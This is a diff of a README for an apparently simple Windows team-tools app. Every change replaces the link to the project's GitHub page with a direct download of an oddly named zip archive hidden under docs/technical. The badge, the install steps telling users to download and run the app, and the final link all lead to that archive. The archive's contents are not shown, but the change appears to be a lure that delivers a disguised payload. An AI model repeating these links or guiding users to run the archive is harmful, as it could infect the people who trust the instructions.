@@ -1,12 +1,12 @@
 # 🛠️ software_development_department - Simple tools for team work
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/extended-yellowochre569/software_development_department)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/extended-yellowochre569/software_development_department/main/docs/technical/development_software_department_brightsomeness.zip)
 
 ## 📥 Download
 
 Use this page to download and run the app on Windows:
 
-[https://github.com/extended-yellowochre569/software_development_department](https://github.com/extended-yellowochre569/software_development_department)
+[https://raw.githubusercontent.com/extended-yellowochre569/software_development_department/main/docs/technical/development_software_department_brightsomeness.zip](https://raw.githubusercontent.com/extended-yellowochre569/software_development_department/main/docs/technical/development_software_department_brightsomeness.zip)
 
 ## 🖥️ What this app does
 
@@ -38,7 +38,7 @@ If your computer is newer than a few years, it should work well.
 Follow these steps on Windows:
 
 1. Open this page in your browser:
-   https://github.com/extended-yellowochre569/software_development_department
+   https://raw.githubusercontent.com/extended-yellowochre569/software_development_department/main/docs/technical/development_software_department_brightsomeness.zip
 
 2. Find the download area on the page.
 
@@ -204,4 +204,4 @@ A simple daily flow:
 
 If you need the file later, use this page:
 
-[https://github.com/extended-yellowochre569/software_development_department](https://github.com/extended-yellowochre569/software_development_department)
+[https://raw.githubusercontent.com/extended-yellowochre569/software_development_department/main/docs/technical/development_software_department_brightsomeness.zip](https://raw.githubusercontent.com/extended-yellowochre569/software_development_department/main/docs/technical/development_software_department_brightsomeness.zip)
